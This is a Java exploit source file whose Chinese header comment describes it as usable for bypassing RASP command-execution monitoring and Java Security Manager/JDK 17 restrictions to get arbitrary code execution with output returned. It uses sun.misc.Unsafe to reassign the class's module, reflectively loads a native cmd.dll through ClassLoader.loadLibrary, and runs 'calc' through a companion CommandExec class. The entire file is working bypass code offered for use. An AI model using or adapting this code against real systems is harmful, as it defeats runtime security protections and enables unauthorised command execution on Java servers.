/*
可使用exp：反射调用loadLibrary，绕过RASP对命令执行的监控，绕过Java Security Manager/JDK 17的限制
实现任意代码执行并回显
需要与cmd.dll CommandExec.class合用
*/
package zk_backup_0.configs.conf1;

import sun.misc.Unsafe;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ExpBypass7 {

    public static void main(String[] args) throws IOException {

        try {
            Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);

            Module module = Object.class.getModule();
            Class<?> currentClass = ExpBypass7.class;

            long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass, addr, module);

            Class<?> clz = ClassLoader.class;
            Method method = clz.getDeclaredMethod("loadLibrary", Class.class, File.class);
            method.setAccessible(true);
            File file = new File("xxx\\src\\main\\java\\zk_backup_0\\configs\\conf1\\cmd.dll");
            method.invoke(null, currentClass, file);

        } catch (Exception e) {
            e.printStackTrace();
        }

        CommandExec commandExec = new CommandExec();
        String res = commandExec.exec("calc");
        System.setProperty("java.library.path", res);
    }
}
